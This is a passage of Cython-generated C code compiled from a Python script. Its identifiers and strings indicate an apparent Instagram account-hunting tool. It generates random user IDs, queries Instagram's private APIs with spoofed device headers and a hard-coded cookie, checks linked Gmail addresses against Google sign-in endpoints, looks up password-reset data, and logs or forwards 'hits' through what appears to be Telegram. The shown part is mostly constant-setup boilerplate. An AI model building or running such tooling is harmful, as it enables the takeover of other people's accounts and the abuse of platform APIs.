  {&__pyx_n_u_variables, __pyx_k_variables, sizeof(__pyx_k_variables), 0, 1, 0, 1},
  {&__pyx_kp_u_vipbizz_txt, __pyx_k_vipbizz_txt, sizeof(__pyx_k_vipbizz_txt), 0, 1, 0, 0},
  {&__pyx_n_s_vlo, __pyx_k_vlo, sizeof(__pyx_k_vlo), 0, 0, 1, 1},
  {&__pyx_n_u_watch, __pyx_k_watch, sizeof(__pyx_k_watch), 0, 1, 0, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {&__pyx_n_u_x, __pyx_k_x, sizeof(__pyx_k_x), 0, 1, 0, 1},
  {&__pyx_n_u_x86, __pyx_k_x86, sizeof(__pyx_k_x86), 0, 1, 0, 1},
  {&__pyx_n_u_x86_64, __pyx_k_x86_64, sizeof(__pyx_k_x86_64), 0, 1, 0, 1},
  {&__pyx_kp_u_x_bloks_is_layout_rtl, __pyx_k_x_bloks_is_layout_rtl, sizeof(__pyx_k_x_bloks_is_layout_rtl), 0, 1, 0, 0},
  {&__pyx_kp_u_x_bloks_version_id, __pyx_k_x_bloks_version_id, sizeof(__pyx_k_x_bloks_version_id), 0, 1, 0, 0},
  {&__pyx_kp_u_x_chrome_connected, __pyx_k_x_chrome_connected, sizeof(__pyx_k_x_chrome_connected), 0, 1, 0, 0},
  {&__pyx_kp_u_x_client_data, __pyx_k_x_client_data, sizeof(__pyx_k_x_client_data), 0, 1, 0, 0},
  {&__pyx_kp_u_x_csrftoken, __pyx_k_x_csrftoken, sizeof(__pyx_k_x_csrftoken), 0, 1, 0, 0},
  {&__pyx_kp_u_x_fb_connection_type, __pyx_k_x_fb_connection_type, sizeof(__pyx_k_x_fb_connection_type), 0, 1, 0, 0},
  {&__pyx_kp_u_x_fb_friendly_name, __pyx_k_x_fb_friendly_name, sizeof(__pyx_k_x_fb_friendly_name), 0, 1, 0, 0},
  {&__pyx_kp_u_x_fb_lsd, __pyx_k_x_fb_lsd, sizeof(__pyx_k_x_fb_lsd), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_android_id, __pyx_k_x_ig_android_id, sizeof(__pyx_k_x_ig_android_id), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_app_id, __pyx_k_x_ig_app_id, sizeof(__pyx_k_x_ig_app_id), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_app_locale, __pyx_k_x_ig_app_locale, sizeof(__pyx_k_x_ig_app_locale), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_bandwidth_speed_kbps, __pyx_k_x_ig_bandwidth_speed_kbps, sizeof(__pyx_k_x_ig_bandwidth_speed_kbps), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_bandwidth_totalbytes_b, __pyx_k_x_ig_bandwidth_totalbytes_b, sizeof(__pyx_k_x_ig_bandwidth_totalbytes_b), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_bandwidth_totaltime_ms, __pyx_k_x_ig_bandwidth_totaltime_ms, sizeof(__pyx_k_x_ig_bandwidth_totaltime_ms), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_capabilities, __pyx_k_x_ig_capabilities, sizeof(__pyx_k_x_ig_capabilities), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_connection_type, __pyx_k_x_ig_connection_type, sizeof(__pyx_k_x_ig_connection_type), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_device_id, __pyx_k_x_ig_device_id, sizeof(__pyx_k_x_ig_device_id), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_device_locale, __pyx_k_x_ig_device_locale, sizeof(__pyx_k_x_ig_device_locale), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_family_device_id, __pyx_k_x_ig_family_device_id, sizeof(__pyx_k_x_ig_family_device_id), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_mapped_locale, __pyx_k_x_ig_mapped_locale, sizeof(__pyx_k_x_ig_mapped_locale), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_timezone_offset, __pyx_k_x_ig_timezone_offset, sizeof(__pyx_k_x_ig_timezone_offset), 0, 1, 0, 0},
  {&__pyx_kp_u_x_ig_www_claim, __pyx_k_x_ig_www_claim, sizeof(__pyx_k_x_ig_www_claim), 0, 1, 0, 0},
  {&__pyx_kp_u_x_mid, __pyx_k_x_mid, sizeof(__pyx_k_x_mid), 0, 1, 0, 0},
  {&__pyx_kp_u_x_pigeon_rawclienttime, __pyx_k_x_pigeon_rawclienttime, sizeof(__pyx_k_x_pigeon_rawclienttime), 0, 1, 0, 0},
  {&__pyx_kp_u_x_pigeon_session_id, __pyx_k_x_pigeon_session_id, sizeof(__pyx_k_x_pigeon_session_id), 0, 1, 0, 0},
  {&__pyx_kp_u_x_requested_with, __pyx_k_x_requested_with, sizeof(__pyx_k_x_requested_with), 0, 1, 0, 0},
  {&__pyx_kp_u_x_same_domain, __pyx_k_x_same_domain, sizeof(__pyx_k_x_same_domain), 0, 1, 0, 0},
  {&__pyx_n_u_xiaomi, __pyx_k_xiaomi, sizeof(__pyx_k_xiaomi), 0, 1, 0, 1},
  {&__pyx_n_s_yy, __pyx_k_yy, sizeof(__pyx_k_yy), 0, 0, 1, 1},
  {&__pyx_n_u_zh_CN, __pyx_k_zh_CN, sizeof(__pyx_k_zh_CN), 0, 1, 0, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_BaseException = __Pyx_GetBuiltinName(__pyx_n_s_BaseException); if (!__pyx_builtin_BaseException) __PYX_ERR(0, 33, __pyx_L1_error)
  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_n_s_print); if (!__pyx_builtin_print) __PYX_ERR(0, 78, __pyx_L1_error)
  __pyx_builtin_input = __Pyx_GetBuiltinName(__pyx_n_s_input); if (!__pyx_builtin_input) __PYX_ERR(0, 84, __pyx_L1_error)
  __pyx_builtin_range = __Pyx_GetBuiltinName(__pyx_n_s_range); if (!__pyx_builtin_range) __PYX_ERR(0, 630, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 148, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple_ = PyTuple_Pack(2, __pyx_int_6, __pyx_int_9); if (unlikely(!__pyx_tuple_)) __PYX_ERR(0, 93, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple_);
  __Pyx_GIVEREF(__pyx_tuple_);

  
  __pyx_tuple__2 = PyTuple_Pack(2, __pyx_int_3, __pyx_int_9); if (unlikely(!__pyx_tuple__2)) __PYX_ERR(0, 94, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__2);
  __Pyx_GIVEREF(__pyx_tuple__2);

  
  __pyx_tuple__3 = PyTuple_Pack(2, __pyx_int_15, __pyx_int_30); if (unlikely(!__pyx_tuple__3)) __PYX_ERR(0, 95, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__3);
  __Pyx_GIVEREF(__pyx_tuple__3);

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com_signin); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 118, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);

  
  __pyx_tuple__10 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com___sign); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 137, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);

  
  __pyx_tuple__12 = PyTuple_Pack(2, __pyx_kp_u_tl_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__12)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__12);
  __Pyx_GIVEREF(__pyx_tuple__12);
  __pyx_tuple__15 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__15)) __PYX_ERR(0, 148, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__15);
  __Pyx_GIVEREF(__pyx_tuple__15);

  
  __pyx_tuple__17 = PyTuple_Pack(2, __pyx_kp_u_tl_txt, __pyx_n_u_r); if (unlikely(!__pyx_tuple__17)) __PYX_ERR(0, 163, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__17);
  __Pyx_GIVEREF(__pyx_tuple__17);

  
  __pyx_tuple__18 = PyTuple_Pack(1, __pyx_kp_u_https_accounts_google_com___sign_2); if (unlikely(!__pyx_tuple__18)) __PYX_ERR(0, 181, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__18);
  __Pyx_GIVEREF(__pyx_tuple__18);

  
  __pyx_tuple__20 = PyTuple_Pack(1, __pyx_kp_u_https_i_instagram_com_api_v1_acc); if (unlikely(!__pyx_tuple__20)) __PYX_ERR(0, 223, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__20);
  __Pyx_GIVEREF(__pyx_tuple__20);

  
  __pyx_tuple__21 = PyTuple_Pack(2, __pyx_n_u_email, __pyx_kp_u_h); if (unlikely(!__pyx_tuple__21)) __PYX_ERR(0, 227, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__21);
  __Pyx_GIVEREF(__pyx_tuple__21);

  
  __pyx_tuple__22 = PyTuple_Pack(2, __pyx_n_u_email, __pyx_kp_u_Nothing_To_Rest); if (unlikely(!__pyx_tuple__22)) __PYX_ERR(0, 237, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__22);
  __Pyx_GIVEREF(__pyx_tuple__22);

  
  __pyx_tuple__24 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_api_v1_u); if (unlikely(!__pyx_tuple__24)) __PYX_ERR(0, 252, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__24);
  __Pyx_GIVEREF(__pyx_tuple__24);

  
  __pyx_tuple__25 = PyTuple_Pack(2, __pyx_n_u_Followers, __pyx_int_0); if (unlikely(!__pyx_tuple__25)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__25);
  __Pyx_GIVEREF(__pyx_tuple__25);

  
  __pyx_tuple__26 = PyTuple_Pack(2, __pyx_n_u_ID, __pyx_kp_u_0_2); if (unlikely(!__pyx_tuple__26)) __PYX_ERR(0, 267, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__26);
  __Pyx_GIVEREF(__pyx_tuple__26);

  
  __pyx_tuple__27 = PyTuple_Pack(2, __pyx_n_u_Name, __pyx_kp_u_N_A); if (unlikely(!__pyx_tuple__27)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__27);
  __Pyx_GIVEREF(__pyx_tuple__27);
  __pyx_tuple__28 = PyTuple_Pack(2, __pyx_n_u_Following, __pyx_int_0); if (unlikely(!__pyx_tuple__28)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__28);
  __Pyx_GIVEREF(__pyx_tuple__28);
  __pyx_tuple__29 = PyTuple_Pack(2, __pyx_n_u_ID, __pyx_kp_u_N_A); if (unlikely(!__pyx_tuple__29)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__29);
  __Pyx_GIVEREF(__pyx_tuple__29);
  __pyx_tuple__30 = PyTuple_Pack(2, __pyx_n_u_Posts, __pyx_int_0); if (unlikely(!__pyx_tuple__30)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__30);
  __Pyx_GIVEREF(__pyx_tuple__30);
  __pyx_tuple__31 = PyTuple_Pack(2, __pyx_n_u_Bio, __pyx_kp_u_N_A); if (unlikely(!__pyx_tuple__31)) __PYX_ERR(0, 300, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__31);
  __Pyx_GIVEREF(__pyx_tuple__31);

  
  __pyx_tuple__32 = PyTuple_Pack(2, __pyx_kp_u_vipbizz_txt, __pyx_n_u_a); if (unlikely(!__pyx_tuple__32)) __PYX_ERR(0, 319, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__32);
  __Pyx_GIVEREF(__pyx_tuple__32);

  
  __pyx_slice__38 = PySlice_New(Py_None, __pyx_int_16, Py_None); if (unlikely(!__pyx_slice__38)) __PYX_ERR(0, 357, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__38);
  __Pyx_GIVEREF(__pyx_slice__38);

  
  __pyx_tuple__39 = PyTuple_Pack(15, __pyx_n_s_ii, __pyx_n_s_aa, __pyx_n_s_ss, __pyx_n_s_dd, __pyx_n_s_cc, __pyx_n_s_lan, __pyx_n_s_dp, __pyx_n_s_arm, __pyx_n_s_comb, __pyx_n_s_sos, __pyx_n_s_vlo, __pyx_n_s_lop, __pyx_n_s_ki, __pyx_n_s_mo, __pyx_n_s_user_agent_2); if (unlikely(!__pyx_tuple__39)) __PYX_ERR(0, 360, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__39);
  __Pyx_GIVEREF(__pyx_tuple__39);
  __pyx_codeobj__40 = (PyObject*)__Pyx_PyCode_New(0, 0, 15, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__39, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_bunny_user_agent, 360, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__40)) __PYX_ERR(0, 360, __pyx_L1_error)

  
  __pyx_tuple__41 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_api_v1_w); if (unlikely(!__pyx_tuple__41)) __PYX_ERR(0, 403, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__41);
  __Pyx_GIVEREF(__pyx_tuple__41);

  
  __pyx_tuple__42 = PyTuple_Pack(2, __pyx_n_u_mid, __pyx_n_u_Zo8bBAAEAAF27Fed1oBbtK7tGgwj); if (unlikely(!__pyx_tuple__42)) __PYX_ERR(0, 434, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__42);
  __Pyx_GIVEREF(__pyx_tuple__42);

  
  __pyx_tuple__45 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_api_v1_w_2); if (unlikely(!__pyx_tuple__45)) __PYX_ERR(0, 468, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__45);
  __Pyx_GIVEREF(__pyx_tuple__45);

  
  __pyx_tuple__46 = PyTuple_Pack(2, __pyx_n_u_ig_did, __pyx_kp_u__4); if (unlikely(!__pyx_tuple__46)) __PYX_ERR(0, 477, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__46);
  __Pyx_GIVEREF(__pyx_tuple__46);

  
  __pyx_tuple__47 = PyTuple_Pack(2, __pyx_n_u_ig_nrcb, __pyx_kp_u__4); if (unlikely(!__pyx_tuple__47)) __PYX_ERR(0, 478, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__47);
  __Pyx_GIVEREF(__pyx_tuple__47);

  
  __pyx_tuple__53 = PyTuple_Pack(2, __pyx_int_100000, __pyx_int_21254029834); if (unlikely(!__pyx_tuple__53)) __PYX_ERR(0, 579, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__53);
  __Pyx_GIVEREF(__pyx_tuple__53);

  
  __pyx_tuple__54 = PyTuple_Pack(2, __pyx_int_150, __pyx_int_999); if (unlikely(!__pyx_tuple__54)) __PYX_ERR(0, 580, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__54);
  __Pyx_GIVEREF(__pyx_tuple__54);

  
  __pyx_tuple__55 = PyTuple_Pack(2, __pyx_int_100, __pyx_int_1300); if (unlikely(!__pyx_tuple__55)) __PYX_ERR(0, 583, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__55);
  __Pyx_GIVEREF(__pyx_tuple__55);
  __pyx_tuple__56 = PyTuple_Pack(2, __pyx_int_200, __pyx_int_2000); if (unlikely(!__pyx_tuple__56)) __PYX_ERR(0, 583, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__56);
  __Pyx_GIVEREF(__pyx_tuple__56);

  
  __pyx_tuple__57 = PyTuple_Pack(2, __pyx_int_111, __pyx_int_999); if (unlikely(!__pyx_tuple__57)) __PYX_ERR(0, 585, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__57);
  __Pyx_GIVEREF(__pyx_tuple__57);

  
  __pyx_tuple__58 = PyTuple_Pack(1, __pyx_kp_u_https_www_instagram_com_api_grap); if (unlikely(!__pyx_tuple__58)) __PYX_ERR(0, 611, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__58);
  __Pyx_GIVEREF(__pyx_tuple__58);

  
  __pyx_tuple__59 = PyTuple_Pack(2, __pyx_n_u_username, __pyx_kp_u__4); if (unlikely(!__pyx_tuple__59)) __PYX_ERR(0, 617, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__59);
  __Pyx_GIVEREF(__pyx_tuple__59);

  
  __pyx_tuple__61 = PyTuple_Pack(2, __pyx_n_u_follower_count, __pyx_int_0); if (unlikely(!__pyx_tuple__61)) __PYX_ERR(0, 620, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__61);
  __Pyx_GIVEREF(__pyx_tuple__61);

  
  __pyx_tuple__62 = PyTuple_Pack(2, __pyx_n_u_media_count, __pyx_int_0); if (unlikely(!__pyx_tuple__62)) __PYX_ERR(0, 621, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__62);
  __Pyx_GIVEREF(__pyx_tuple__62);

  
  __pyx_tuple__63 = PyTuple_Pack(1, __pyx_kp_u_pip_install_user_agent); if (unlikely(!__pyx_tuple__63)) __PYX_ERR(0, 34, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__63);
  __Pyx_GIVEREF(__pyx_tuple__63);

  
  __pyx_tuple__64 = PyTuple_Pack(1, __pyx_kp_u_pip_install_python_cfonts); if (unlikely(!__pyx_tuple__64)) __PYX_ERR(0, 74, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__64);
  __Pyx_GIVEREF(__pyx_tuple__64);

  
  __pyx_tuple__65 = PyTuple_Pack(1, __pyx_kp_u_BIZZ); if (unlikely(!__pyx_tuple__65)) __PYX_ERR(0, 77, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__65);
  __Pyx_GIVEREF(__pyx_tuple__65);

  
  __pyx_tuple__66 = PyTuple_Pack(1, __pyx_kp_u_1_91m); if (unlikely(!__pyx_tuple__66)) __PYX_ERR(0, 78, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__66);
  __Pyx_GIVEREF(__pyx_tuple__66);

  
  __pyx_tuple__68 = PyTuple_Pack(1, __pyx_kp_u_1m_36m_1m_33m); if (unlikely(!__pyx_tuple__68)) __PYX_ERR(0, 84, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__68);
  __Pyx_GIVEREF(__pyx_tuple__68);

  
  __pyx_tuple__69 = PyTuple_Pack(1, __pyx_kp_u_1m_32m_1m_31m); if (unlikely(!__pyx_tuple__69)) __PYX_ERR(0, 86, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__69);
  __Pyx_GIVEREF(__pyx_tuple__69);

  
  __pyx_tuple__70 = PyTuple_Pack(17, __pyx_n_s_n1, __pyx_n_s_n2, __pyx_n_s_host, __pyx_n_s_he3, __pyx_n_s_res1, __pyx_n_s_tok, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_tl, __pyx_n_s_f, __pyx_n_s_e, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__70)) __PYX_ERR(0, 91, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__70);
  __Pyx_GIVEREF(__pyx_tuple__70);
  __pyx_codeobj__71 = (PyObject*)__Pyx_PyCode_New(0, 0, 17, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__70, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_tll, 91, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__71)) __PYX_ERR(0, 91, __pyx_L1_error)

  
  __pyx_tuple__72 = PyTuple_Pack(9, __pyx_n_s_email, __pyx_n_s_o, __pyx_n_s_tl, __pyx_n_s_host, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_data, __pyx_n_s_response); if (unlikely(!__pyx_tuple__72)) __PYX_ERR(0, 158, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__72);
  __Pyx_GIVEREF(__pyx_tuple__72);
  __pyx_codeobj__73 = (PyObject*)__Pyx_PyCode_New(1, 0, 9, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__72, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_check_gmail, 158, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__73)) __PYX_ERR(0, 158, __pyx_L1_error)

  
  __pyx_tuple__74 = PyTuple_Pack(6, __pyx_n_s_user, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_r, __pyx_n_s_e); if (unlikely(!__pyx_tuple__74)) __PYX_ERR(0, 198, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__74);
  __Pyx_GIVEREF(__pyx_tuple__74);
  __pyx_codeobj__75 = (PyObject*)__Pyx_PyCode_New(1, 0, 6, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__74, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_rest, 198, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__75)) __PYX_ERR(0, 198, __pyx_L1_error)

  
  __pyx_tuple__76 = PyTuple_Pack(18, __pyx_n_s_username, __pyx_n_s_jj, __pyx_n_s_user_data, __pyx_n_s_reset_value, __pyx_n_s_cookies, __pyx_n_s_headers, __pyx_n_s_params, __pyx_n_s_response, __pyx_n_s_is_business, __pyx_n_s_followers, __pyx_n_s_user_id, __pyx_n_s_account_year, __pyx_n_s_send_to_bunny_only, __pyx_n_s_header, __pyx_n_s_hit_data, __pyx_n_s_file, __pyx_n_s_inline_keyboard, __pyx_n_s_data); if (unlikely(!__pyx_tuple__76)) __PYX_ERR(0, 233, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__76);
  __Pyx_GIVEREF(__pyx_tuple__76);
  __pyx_codeobj__77 = (PyObject*)__Pyx_PyCode_New(2, 0, 18, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__76, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_bunnyiginfo, 233, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__77)) __PYX_ERR(0, 233, __pyx_L1_error)

  
  __pyx_tuple__78 = PyTuple_Pack(3, __pyx_n_s_email, __pyx_n_s_username, __pyx_n_s_jj); if (unlikely(!__pyx_tuple__78)) __PYX_ERR(0, 337, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__78);
  __Pyx_GIVEREF(__pyx_tuple__78);
  __pyx_codeobj__79 = (PyObject*)__Pyx_PyCode_New(1, 0, 3, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__78, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_bunny, 337, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__79)) __PYX_ERR(0, 337, __pyx_L1_error)

  
  __pyx_tuple__80 = PyTuple_Pack(29, __pyx_n_s_email, __pyx_n_s_Variable, __pyx_n_s_variable_instance, __pyx_n_s_bunny_user_agent, __pyx_n_s_bunny_user_agent, __pyx_n_s_method, __pyx_n_s_csrftoken, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_ua, __pyx_n_s_device_id_2, __pyx_n_s_uui, __pyx_n_s_cookies, __pyx_n_s_responses, __pyx_n_s_mid, __pyx_n_s_url, __pyx_n_s_e, __pyx_n_s_csrf, __pyx_n_s_ig_did, __pyx_n_s_ig_nrcb, __pyx_n_s_app, __pyx_n_s_response2, __pyx_n_s_payload, __pyx_n_s_response_data, __pyx_n_s_res, __pyx_n_s_country, __pyx_n_s_genexpr, __pyx_n_s_genexpr); if (unlikely(!__pyx_tuple__80)) __PYX_ERR(0, 349, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__80);
  __Pyx_GIVEREF(__pyx_tuple__80);
  __pyx_codeobj__81 = (PyObject*)__Pyx_PyCode_New(1, 0, 29, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__80, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_bunnycheck, 349, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__81)) __PYX_ERR(0, 349, __pyx_L1_error)

  
  __pyx_tuple__82 = PyTuple_Pack(13, __pyx_n_s_user_id, __pyx_n_s_rnd, __pyx_n_s_user_agent_2, __pyx_n_s_lsd, __pyx_n_s_headers, __pyx_n_s_data, __pyx_n_s_response, __pyx_n_s_response_json, __pyx_n_s_user_data, __pyx_n_s_username, __pyx_n_s_follower_count, __pyx_n_s_media_count, __pyx_n_s_email); if (unlikely(!__pyx_tuple__82)) __PYX_ERR(0, 576, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__82);
  __Pyx_GIVEREF(__pyx_tuple__82);
  __pyx_codeobj__83 = (PyObject*)__Pyx_PyCode_New(0, 0, 13, 0, CO_OPTIMIZED|CO_NEWLOCALS, __pyx_empty_bytes, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_tuple__82, __pyx_empty_tuple, __pyx_empty_tuple, __pyx_kp_s_source_py, __pyx_n_s_bunnymain, 576, __pyx_empty_bytes); if (unlikely(!__pyx_codeobj__83)) __PYX_ERR(0, 576, __pyx_L1_error)
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  __pyx_umethod_PyDict_Type_get.type = (PyObject*)&PyDict_Type;
  __pyx_umethod_PyDict_Type_keys.type = (PyObject*)&PyDict_Type;
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_1 = PyInt_FromLong(1); if (unlikely(!__pyx_int_1)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_2 = PyInt_FromLong(2); if (unlikely(!__pyx_int_2)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_3 = PyInt_FromLong(3); if (unlikely(!__pyx_int_3)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_4 = PyInt_FromLong(4); if (unlikely(!__pyx_int_4)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_5 = PyInt_FromLong(5); if (unlikely(!__pyx_int_5)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_6 = PyInt_FromLong(6); if (unlikely(!__pyx_int_6)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_8 = PyInt_FromLong(8); if (unlikely(!__pyx_int_8)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_9 = PyInt_FromLong(9); if (unlikely(!__pyx_int_9)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_10 = PyInt_FromLong(10); if (unlikely(!__pyx_int_10)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_15 = PyInt_FromLong(15); if (unlikely(!__pyx_int_15)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_16 = PyInt_FromLong(16); if (unlikely(!__pyx_int_16)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_30 = PyInt_FromLong(30); if (unlikely(!__pyx_int_30)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_32 = PyInt_FromLong(32); if (unlikely(!__pyx_int_32)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_60 = PyInt_FromLong(60); if (unlikely(!__pyx_int_60)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_100 = PyInt_FromLong(100); if (unlikely(!__pyx_int_100)) __PYX_ERR(0, 4, __pyx_L1_error)
  __pyx_int_111 = PyInt_FromLong(111); if (unlikely(!__pyx_int_111)) __PYX_ERR(0, 4, __pyx_L1_error)
